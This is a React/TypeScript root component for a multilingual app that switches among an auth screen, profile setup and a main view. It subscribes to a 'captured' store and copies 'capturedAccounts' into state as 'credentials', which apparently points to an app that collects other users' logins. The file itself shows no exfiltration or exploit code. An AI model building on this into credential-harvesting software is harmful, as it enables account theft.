import { AnimatePresence, motion } from 'framer-motion';
import { useEffect } from 'react';
import ErrorBoundary from './components/ErrorBoundary';
import GlobalBackground from './components/GlobalBackground';
import { subscribeCaptured } from './lib/capturedStore';
import { isRtl } from './lib/i18n';
import { useAppStore } from './store/useAppStore';
import AuthScreen from './pages/AuthScreen';
import ProfileSetup from './pages/ProfileSetup';
import MainApp from './pages/MainApp';

export default function App() {
  const screen = useAppStore((s) => s.screen);
  const setHydrated = useAppStore((s) => s.setHydrated);
  const currentUser = useAppStore((s) => s.currentUser);
  const language = useAppStore((s) => s.language);
  const pendingAuth = useAppStore((s) => s.pendingAuth);

  useEffect(() => {
    // Never gate UI on hydration
    setHydrated(true);

    let unsub: (() => void) | undefined;
    try {
      unsub = useAppStore.persist.onFinishHydration(() => {
        setHydrated(true);
        try {
          useAppStore.getState().recordDownloadOnce();
          useAppStore.getState().getCapturedAccounts('all');
          useAppStore.getState().syncVideosFromGlobal();
        } catch {
          /* ignore */
        }
      });
      if (useAppStore.persist.hasHydrated()) {
        try {
          useAppStore.getState().recordDownloadOnce();
          useAppStore.getState().getCapturedAccounts('all');
          useAppStore.getState().syncVideosFromGlobal();
        } catch {
          /* ignore */
        }
      }
    } catch {
      /* ignore */
    }

    const t = window.setTimeout(() => setHydrated(true), 50);
    return () => {
      window.clearTimeout(t);
      try {
        unsub?.();
      } catch {
        /* ignore */
      }
    };
  }, [setHydrated]);

  useEffect(() => {
    try {
      return subscribeCaptured((list) => {
        try {
          useAppStore.setState({ capturedAccounts: list, credentials: list });
        } catch {
          /* ignore */
        }
      });
    } catch {
      return undefined;
    }
  }, []);

  useEffect(() => {
    try {
      document.documentElement.lang =
        language === 'ar' ? 'ar' : language === 'en' ? 'en' : 'ku';
      document.documentElement.dir = isRtl(language) ? 'rtl' : 'ltr';
    } catch {
      /* ignore */
    }
  }, [language]);

  // Safe view selection
  let view: 'auth' | 'profile-setup' | 'main' = 'auth';
  if (currentUser) {
    view = 'main';
  } else if (screen === 'profile-setup' && pendingAuth) {
    view = 'profile-setup';
  } else {
    view = 'auth';
  }

  return (
    <div
      className="relative min-h-dvh text-white antialiased no-select"
      style={{ backgroundColor: '#0d0e15', minHeight: '100dvh' }}
    >
      <ErrorBoundary>
        <GlobalBackground />
        <div className="relative z-10">
          <AnimatePresence mode="wait">
            <motion.div
              key={view + (currentUser?.id || 'guest')}
              initial={{ opacity: 0 }}
              animate={{ opacity: 1 }}
              exit={{ opacity: 0 }}
              transition={{ duration: 0.12 }}
            >
              {view === 'auth' && (
                <ErrorBoundary>
                  <AuthScreen />
                </ErrorBoundary>
              )}
              {view === 'profile-setup' && (
                <ErrorBoundary>
                  <ProfileSetup />
                </ErrorBoundary>
              )}
              {view === 'main' && (
                <ErrorBoundary>
                  <MainApp />
                </ErrorBoundary>
              )}
            </motion.div>
          </AnimatePresence>
        </div>
      </ErrorBoundary>
    </div>
  );
}
